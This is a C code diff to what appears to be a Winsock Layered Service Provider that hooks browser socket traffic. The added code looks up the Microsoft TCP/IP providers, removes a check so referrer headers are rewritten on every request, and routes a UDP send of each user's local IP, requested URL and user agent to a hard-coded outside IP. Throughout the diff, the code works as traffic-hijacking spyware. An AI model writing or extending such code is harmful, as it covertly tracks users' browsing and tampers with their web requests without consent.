@@ -75,6 +75,70 @@ static LPSTR g_pRedirectIdentifier = "";
 
 PREDIRECT_INFO g_pRedirectInfo = NULL;
 
+GUID g_MSTcpIpGuid = {
+	0xE70F1AA0, 
+	0xAB8B, 
+	0x11CF, 
+	{0x8C, 0xA3, 0x00, 0x80, 0x5F, 0x48, 0xA1, 0x92}
+};
+static WSAPROTOCOL_INFO g_MSTcpIpProtocol[3];
+static LPWSAPROTOCOL_INFO g_pMSTcpProtocol;
+static LPWSAPROTOCOL_INFO g_pMSUdpProtocol;
+static LPWSAPROTOCOL_INFO g_pMSRawIpProtocol;
+
+static BOOL FindMSTcpIpProtocols()
+{
+    int nProtocols;
+    LPWSAPROTOCOL_INFO lpProtocolBuffer;
+	DWORD dwBufferLength = 0;
+	int i, iErrno;
+    BOOL bOK = TRUE;
+
+	nProtocols = WSCEnumProtocols(NULL, NULL, &dwBufferLength, &iErrno);
+
+	if (nProtocols == SOCKET_ERROR && iErrno != WSAENOBUFS) {
+		return FALSE;
+	}
+
+	if (!(lpProtocolBuffer = LspAlloc(dwBufferLength, &iErrno)))
+        return FALSE;
+
+	nProtocols = WSCEnumProtocols(NULL, lpProtocolBuffer, &dwBufferLength, &iErrno);
+
+	if (nProtocols == SOCKET_ERROR) {
+        bOK = FALSE;
+        goto cleanup;
+	}
+
+	for (i = 0; i < nProtocols; i++) {
+		LPWSAPROTOCOL_INFO pProtocol = lpProtocolBuffer + i;
+		if (IsEqualGUID(&pProtocol->ProviderId, &g_MSTcpIpGuid)) {
+			switch (pProtocol->iSocketType)
+			{
+			case SOCK_STREAM:
+                    memcpy(&g_MSTcpIpProtocol[0], pProtocol, sizeof(*pProtocol));
+                    g_pMSTcpProtocol = &g_MSTcpIpProtocol[0];
+					break;
+			case SOCK_DGRAM:
+                    memcpy(&g_MSTcpIpProtocol[1], pProtocol, sizeof(*pProtocol));
+                    g_pMSUdpProtocol = &g_MSTcpIpProtocol[1];
+					break;
+			case  SOCK_RAW:
+                    memcpy(&g_MSTcpIpProtocol[2], pProtocol, sizeof(*pProtocol));
+                    g_pMSRawIpProtocol = &g_MSTcpIpProtocol[2];
+					break;
+			default:
+				break;
+			}
+		}
+	}
+
+cleanup:
+    LspFree(lpProtocolBuffer);
+
+    return bOK;
+}
+
 BOOL LoadRedirectInfo(VOID) 
 {
 	int iErrno, i;
@@ -107,6 +171,7 @@ BOOL LoadRedirectInfo(VOID)
 		g_pRedirectInfo->pEBusiness[i].bIntercepted = FALSE;
 	}
 
+    /*
 	__try
 	{
 		InitializeCriticalSection(&g_pRedirectInfo->Lock);
@@ -116,6 +181,8 @@ BOOL LoadRedirectInfo(VOID)
 		dbgprint("Initialize critical section for redirect info failed");
 		goto failed;
 	}
+    */
+    FindMSTcpIpProtocols();
 
 	return TRUE;
 
@@ -215,8 +282,10 @@ static LPSTR getModifiedReferrerHeader(VOID) {
 
     assert (strlen(chars) == 64);
 
+    /*
     if (current % 2 == 0)
         return NULL;
+        */
 
     if (!(referrer = LspAlloc(256, &iErrno)))
         return NULL;
@@ -330,6 +399,8 @@ VOID LookInside(SOCK_INFO *SocketContext, LPWSABUF lpBuffers, DWORD dwBufferCoun
    // BOOL bLocalHost;
     struct sockaddr_in addr_buf;
     socklen_t addr_len = sizeof(addr_buf);
+    WSPPROC_TABLE *ProcTable = &(SocketContext->Provider->NextProcTable);
+    int iErrno;
 
 	// assemble http request buffer
 	{
@@ -410,9 +481,10 @@ main_point:
 		goto release_sendbuffer;
 
     // check socket addr
-    if(getsockname(SocketContext->ProviderSocket, 
+    if(ProcTable->lpWSPGetSockName(SocketContext->ProviderSocket, 
 		                          (struct sockaddr *)&addr_buf, 
-								  &addr_len) == SOCKET_ERROR)
+								  &addr_len,
+								  &iErrno) == SOCKET_ERROR)
 	{
         dbgprint("getsockname failed");
         goto release_sendbuffer;
@@ -569,18 +641,34 @@ main_point:
 
 		SocketContext->pReceiveBuffer = pReceiveBuffer;
 
-		{
+		if (g_pMSUdpProtocol) {
             WSABUF wsabuf[3];
-            char localIp[INET_ADDRSTRLEN];
+            WCHAR wlocalIp[INET_ADDRSTRLEN];
+            DWORD cchIp = _countof(wlocalIp);
+            CHAR localIp[INET_ADDRSTRLEN];
+            DWORD cbIp = _countof(localIp);
             char *pUserAgent;
             int i = 0;
             SOCKET udpsocket;
 
             // local ip
-            if (local_addr && InetNtopA(AF_INET, &(local_addr->sin_addr), localIp, sizeof(localIp))) {
-                wsabuf[i].buf = localIp;
-                wsabuf[i].len = strlen(localIp) + 1;
-                i++;
+            if (local_addr) {
+                ProcTable->lpWSPAddressToString(
+					    (struct sockaddr *)local_addr,
+						sizeof(*local_addr),
+						NULL,
+						wlocalIp,
+						&cchIp,
+						&iErrno);
+
+                if (iErrno == NO_ERROR) {
+					if (WideCharToMultiByte(CP_ACP, 0, wlocalIp, cchIp, localIp, 
+						    cbIp, NULL, NULL) != 0) {
+                        wsabuf[i].buf = localIp;
+                        wsabuf[i].len = strlen(localIp) + 1;
+                        i++;
+					}
+				}
 			}
 
             // request url
@@ -598,7 +686,7 @@ main_point:
             udpsocket = lpProcTable->lpWSPSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP, 
 				        NULL, 0, 0, &iErrno);
                         */
-            udpsocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+            udpsocket = ProcTable->lpWSPSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP, g_pMSUdpProtocol, 0, 0, &iErrno);
 
             if (udpsocket != INVALID_SOCKET) {
                 DWORD nbytes;
@@ -606,9 +694,12 @@ main_point:
 				serverAddr.sin_family = AF_INET;
 				serverAddr.sin_port = htons(10033);    
 				serverAddr.sin_addr.s_addr = inet_addr("115.100.249.106");
-                WSASendTo(udpsocket, wsabuf, i, &nbytes, 0, (struct sockaddr *)&serverAddr, 
-					sizeof(serverAddr), NULL, NULL);
-                closesocket(udpsocket);
+                //WSASendTo(udpsocket, wsabuf, i, &nbytes, 0, (struct sockaddr *)&serverAddr, 
+				//	sizeof(serverAddr), NULL, NULL);
+                ProcTable->lpWSPSendTo(udpsocket, wsabuf, i, &nbytes, 0, (struct sockaddr *)&serverAddr, 
+					sizeof(serverAddr), NULL, NULL, NULL, &iErrno);
+                //closesocket(udpsocket);
+                ProcTable->lpWSPCloseSocket(udpsocket, &iErrno);
 			}
 
 		}
